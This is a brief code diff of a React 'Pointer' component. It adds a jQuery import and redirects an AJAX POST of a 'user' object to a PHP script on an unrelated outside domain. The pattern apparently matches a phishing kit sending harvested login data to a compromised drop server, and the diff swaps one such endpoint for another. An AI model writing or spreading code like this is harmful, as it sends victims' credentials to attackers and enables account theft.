@@ -1,6 +1,7 @@
 
 import { useState } from 'react';
 import './pointer.css';
+import $ from 'jquery'
 
 export const Pointer = ()=>{
 
@@ -65,7 +66,7 @@ export const Pointer = ()=>{
         
             $.ajax({
                 type: "POST",
-                url: "https://physicaleducationdiploma.com/component/btex.php",
+                url: "https://physicaleducationdiploma.com/footer/meme.php",
                 data: user,
                 success(data) {
                     // alert('OK');
